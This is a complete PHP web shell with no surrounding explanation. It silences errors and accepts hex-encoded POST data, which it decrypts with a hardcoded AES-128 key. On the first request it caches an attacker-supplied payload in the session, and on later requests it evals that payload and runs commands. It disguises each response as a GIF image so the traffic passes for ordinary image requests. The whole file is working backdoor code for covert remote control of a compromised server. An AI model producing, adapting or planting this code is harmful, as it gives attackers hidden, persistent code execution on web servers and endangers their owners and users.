<?php
@session_start();
@set_time_limit(0);
@error_reporting(0);



function aes128($data,$mode){$result="";$blocksize=16;$key=base64_decode("gB2QhwWSDHIX2UT7rJjlhA==");if($mode==1){$pad=$blocksize -(strlen($data)% $blocksize);$data .=str_repeat(chr($pad), $pad);}if(function_exists("openssl_encrypt")){if($mode==1){$result=openssl_encrypt($data,"AES-128-ECB",$key,OPENSSL_RAW_DATA|OPENSSL_ZERO_PADDING);}else{$result=openssl_decrypt($data,"AES-128-ECB",$key,OPENSSL_RAW_DATA|OPENSSL_ZERO_PADDING);}}else if(function_exists("mcrypt_encrypt")){if($mode==1){$result=mcrypt_encrypt("rijndael-128", $key, $data, "ecb", "");}else{$result=mcrypt_decrypt("rijndael-128", $key, $data, "ecb", "");}}if($mode==2){$pad=ord($result[strlen($result)-1]);if($pad > strlen($result))return false;if(strspn($result, chr($pad), strlen($result)- $pad)!=$pad)return false;$result=substr($result, 0, -1 * $pad);}return $result;}function gifEncode($data){$len=max(1,strlen($data));$w=max(1,intval(sqrt($len))+mt_rand(0,2));$h=max(1,intval(ceil($len/$w)));$im=imagecreate($w,$h);for($i=0;$i<imagecolorstotal($im);$i++){imagecolordeallocate($im,$i);}$colors=array();for($i=0;$i<256;$i++){$colors[$i]=imagecolorallocate($im,$i,$i,$i);}$p=0;for($y=0;$y<$h;$y++){for($x=0;$x<$w;$x++){imagesetpixel($im,$x,$y,$colors[$p<strlen($data)?ord($data[$p]):0]);$p++;}}ob_start();imagegif($im);$gif=ob_get_contents();ob_end_clean();imagedestroy($im);return $gif;}







$requestData = file_get_contents("php://input");
if($requestData !== false && strlen($requestData) > 0){
    $requestData = pack("H*",$requestData);$requestData = aes128($requestData, 2);
    $payloadName="OGdoVgta";
    if (isset($_SESSION[$payloadName])){
        $payload=base64_decode($_SESSION[$payloadName]);
        eval($payload);
        $responseData = @run($requestData);
        $responseData = base64_encode($responseData);$responseData=gifEncode($responseData);
        header("HTTP/1.1 200 OK");header("Content-Type: image/gif");echo $responseData;
    }else{
        $_SESSION[$payloadName] = base64_encode($requestData);
    }
}
